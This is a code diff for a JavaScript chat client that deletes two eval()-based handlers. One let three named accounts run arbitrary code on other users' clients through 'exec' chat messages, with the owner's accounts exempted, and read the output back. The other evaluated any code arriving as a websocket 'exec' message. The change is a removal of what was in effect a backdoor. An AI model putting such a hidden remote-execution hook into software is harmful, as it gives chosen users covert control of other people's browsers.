@@ -525,21 +525,6 @@ Owner:<ul>
                 break;
             case "message":
                 msg.m.m = msg.m.m.replace(/&gt;/g, ">").replace(/&lt;/g, "<");
-                if (["NKY", "wolfie", "RayhanADev"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
-                    if (msg.m.r !== -2 && msg.m.m.startsWith("exec " + user + " ")) {
-                        try {
-                            sendMessage(eval(msg.m.m.slice(6 + user.length)));
-                        } catch (e) {
-                            sendMessage(e.toString());
-                        }
-                    } else if (msg.m.r !== -2 && msg.m.m.startsWith("exec $")) {
-                        try {
-                            sendMessage(eval(msg.m.m.slice(7)));
-                        } catch (e) {
-                            sendMessage(e.toString());
-                        }
-                    }
-                }
                 if (msg.m.r !== -2 && msg.m.s === "NKY" && msg.m.m.match(new RegExp("^ban " + user + "( |$)"))) {
                     /** @type {string[]} */
                     let split = msg.m.m.split(/ +/).slice(2);
@@ -761,19 +746,6 @@ Owner:<ul>
                 });
                 break;
             case "exec":
-                try {
-                    send({
-                        e: "exec",
-                        exec: msg.exec,
-                        output: eval(msg.exec)
-                    }, clientWS);
-                } catch (err) {
-                    send({
-                        e: "error",
-                        exec: msg.exec,
-                        error: String(err)
-                    }, clientWS);
-                }
                 break;
         }
     });
